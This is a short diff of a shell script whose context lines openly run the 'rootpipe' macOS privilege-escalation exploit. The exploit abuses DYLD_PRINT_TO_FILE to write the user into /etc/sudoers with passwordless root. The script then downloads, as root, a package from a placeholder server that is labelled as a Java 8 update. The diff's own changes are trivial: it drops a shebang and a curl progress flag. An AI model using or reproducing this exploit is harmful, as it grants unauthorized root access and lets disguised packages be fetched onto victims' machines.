@@ -27,8 +27,6 @@ echo
 
 #--- EPLOIT THE MACHINE WITH ROOTPIPE ---#
 echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo bash <<'INJECTINTOBASH'
-#!/bin/bash
-
 randomTMP=/tmp$$/
 serverAddress=http://<SERVER_ADDRESS>/Java_8_Update_60.pkg
 curledFile=/tmp$$/Java_8_Update_60.pkg
@@ -46,7 +44,7 @@ curledFile=/tmp$$/Java_8_Update_60.pkg
 
 #--- DOWNLOAD THE PACKAGE ---#
     echo -e "\033[1mcURLing Java_8_Update_60.pkg...\033[0m"
-    sudo curl -# $serverAddress -o $curledFile
+    sudo curl $serverAddress -o $curledFile
     echo -e "\033[1mDone.\033[0m"
 
     echo;echo
